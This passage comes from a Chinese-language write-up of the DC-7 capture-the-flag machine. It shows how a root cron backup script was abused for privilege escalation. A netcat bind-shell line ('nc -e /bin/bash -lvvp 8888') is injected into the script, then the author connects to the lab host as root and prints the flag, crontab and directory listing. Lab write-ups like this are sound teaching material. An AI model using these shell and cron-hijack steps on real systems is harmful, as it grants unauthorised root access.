gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.tar.gz
chown dc7user:dc7user /home/dc7user/backups/*
rm /home/dc7user/backups/website.sql
rm /home/dc7user/backups/website.tar.gz
usermod -aG sudo dc7user # 这个指令不行 莫名其妙失败了 因为他就没装上 sudo 这个软件 失算啊失算啊
nc -e /bin/bash -lvvp 8888
> crontab -l # 这里更加坚定了我 在 root 用户下存在 计划任务的想法
no crontab for www-data

```

然后 让子弹飞一会儿

这里的代码都是以 root 用户 权限执行

# Shell 3

静等一段时间之后

```zsh
$ nc 192.168.31.227 8888
whoami
root
cd /root
ls
theflag.txt
cat theflag.txt




888       888          888 888      8888888b.                             888 888 888 888 
888   o   888          888 888      888  "Y88b                            888 888 888 888 
888  d8b  888          888 888      888    888                            888 888 888 888 
888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888 
888d88888b888 d8P  Y8b 888 888      888    888 d88""88b 888 "88b d8P  Y8b 888 888 888 888 
88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P 
8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      "   "   "   "  
888P     Y888  "Y8888  888 888      8888888P"   "Y88P"  888  888  "Y8888  888 888 888 888 


Congratulations!!!

Hope you enjoyed DC-7.  Just wanted to send a big thanks out there to all those
who have provided feedback, and all those who have taken the time to complete these little
challenges.

I'm sending out an especially big thanks to:

@4nqr34z
@D4mianWayne
@0xmzfr
@theart42

If you enjoyed this CTF, send me a tweet via @DCAU7.

id
uid=0(root) gid=0(root) groups=0(root)
usermod -aG sudo dc7user
usermod -h
Usage: usermod [options] LOGIN

Options:
  -c, --comment COMMENT         new value of the GECOS field
  -d, --home HOME_DIR           new home directory for the user account
  -e, --expiredate EXPIRE_DATE  set account expiration date to EXPIRE_DATE
  -f, --inactive INACTIVE       set password inactive after expiration
                                to INACTIVE
  -g, --gid GROUP               force use GROUP as new primary group
  -G, --groups GROUPS           new list of supplementary GROUPS
  -a, --append                  append the user to the supplemental GROUPS
                                mentioned by the -G option without removing
                                him/her from other groups
  -h, --help                    display this help message and exit
  -l, --login NEW_LOGIN         new value of the login name
  -L, --lock                    lock the user account
  -m, --move-home               move contents of the home directory to the
                                new location (use only with -d)
  -o, --non-unique              allow using duplicate (non-unique) UID
  -p, --password PASSWORD       use encrypted password for the new password
  -R, --root CHROOT_DIR         directory to chroot into
  -s, --shell SHELL             new login shell for the user account
  -u, --uid UID                 new UID for the user account
  -U, --unlock                  unlock the user account
  -v, --add-subuids FIRST-LAST  add range of subordinate uids
  -V, --del-subuids FIRST-LAST  remove range of subordinate uids
  -w, --add-subgids FIRST-LAST  add range of subordinate gids
  -W, --del-subgids FIRST-LAST  remove range of subordinate gids
  -Z, --selinux-user SEUSER     new SELinux user mapping for the user account

ls -al
total 36
drwx------  4 root root 4096 Aug 30  2019 .
drwxr-xr-x 22 root root 4096 Aug 29  2019 ..
lrwxrwxrwx  1 root root    9 Aug 29  2019 .bash_history -> /dev/null
-rw-r--r--  1 root root  949 Aug 29  2019 .bashrc
drwxr-xr-x  3 root root 4096 Aug 29  2019 .drush
drwx------  3 root root 4096 Apr  3 16:30 .gnupg
-rw-r--r--  1 root root  148 Aug 18  2015 .profile
-rw-r--r--  1 root root   74 Aug 29  2019 .selected_editor
-rw-r--r--  1 root root 1079 Aug 30  2019 theflag.txt
-rw-r--r--  1 root root  165 Aug 29  2019 .wget-hsts
crontab -l # 这里查看一下 计划任务是否是我们所猜测的那样
# Edit this file to introduce tasks to be run by cron.
# 
# Each task to run has to be defined through a single line
# indicating with different fields when the task will be run
# and what command to run for the task
# 
# To define the time you can provide concrete values for
# minute (m), hour (h), day of month (dom), month (mon),
# and day of week (dow) or use '*' in these fields (for 'any').# 
# Notice that tasks will be started based on the cron's system
# daemon's notion of time and timezones.
# 
# Output of the crontab jobs (including errors) is sent through
# email to the user the crontab file belongs to (unless redirected).

PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin
# 
# For example, you can run a backup of all your user accounts
# at 5 a.m every week with:
# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
# 
# For more information see the manual pages of crontab(5) and cron(8)
# 
# m h  dom mon dow   command

*/15 * * * * /opt/scripts/backups.sh

```

果不其然 

在 shell 中果然存在 root 用户的计划任务

# Success

欣赏一下 flag

```




888       888          888 888      8888888b.                             888 888 888 888 
888   o   888          888 888      888  "Y88b                            888 888 888 888 
888  d8b  888          888 888      888    888                            888 888 888 888 
888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888 
888d88888b888 d8P  Y8b 888 888      888    888 d88""88b 888 "88b d8P  Y8b 888 888 888 888 
88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P 
8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      "   "   "   "  
888P     Y888  "Y8888  888 888      8888888P"   "Y88P"  888  888  "Y8888  888 888 888 888 


Congratulations!!!

Hope you enjoyed DC-7.  Just wanted to send a big thanks out there to all those
who have provided feedback, and all those who have taken the time to complete these little
challenges.

I'm sending out an especially big thanks to:

@4nqr34z
@D4mianWayne
@0xmzfr
@theart42

If you enjoyed this CTF, send me a tweet via @DCAU7.

```

